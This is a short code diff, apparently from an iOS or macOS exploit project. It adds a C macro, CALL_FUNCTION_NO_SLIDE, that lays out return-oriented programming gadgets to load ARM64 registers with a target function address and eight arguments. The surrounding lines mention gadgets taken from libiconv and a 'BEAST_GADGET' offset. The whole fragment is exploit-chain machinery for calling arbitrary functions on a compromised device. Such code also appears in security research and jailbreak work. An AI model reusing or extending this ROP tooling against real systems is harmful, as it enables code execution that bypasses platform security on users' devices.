@@ -256,6 +256,26 @@ add_x0_gadget (from libiconv.2.dylib):
 	ADD_GADGET(); /* x29 */ \
 	ADD_CODE_GADGET(next_addr); /* x30 */ 
 
+#define CALL_FUNCTION_NO_SLIDE(next_addr,addr,arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8) \
+	if (rop_var_arg_num != 0 && rop_var_arg_num != -1) {LOG("WRONG AMOUNT OF ARGS (line:%d)",__LINE__);exit(1);} \
+	rop_var_arg_num = -1; \
+	ADD_GADGET(); \
+	ADD_GADGET(); \
+	ADD_GADGET(); /* d9 */ \
+	ADD_GADGET(); /* d8 */ \
+	ADD_GADGET(); /* x28 */ \
+	ADD_STATIC_GADGET(addr); /* x27 */ \
+	ADD_STATIC_GADGET(arg1); /* x26 */ \
+	ADD_STATIC_GADGET(arg2); /* x25 */ \
+	ADD_STATIC_GADGET(arg3); /* x24 */ \
+	ADD_STATIC_GADGET(arg4); /* x23 */ \
+	ADD_STATIC_GADGET(arg5); /* x22 */ \
+	ADD_STATIC_GADGET(arg7); /* x21 */ \
+	ADD_STATIC_GADGET(arg6); /* x20 */ \
+	ADD_STATIC_GADGET(arg8); /* x19 */ \
+	ADD_GADGET(); /* x29 */ \
+	ADD_CODE_GADGET(next_addr); /* x30 */
+
 #define CALL_FUNC(addr,arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8) \
 	CALL_FUNCTION((offsets)->BEAST_GADGET,addr,arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8);
 
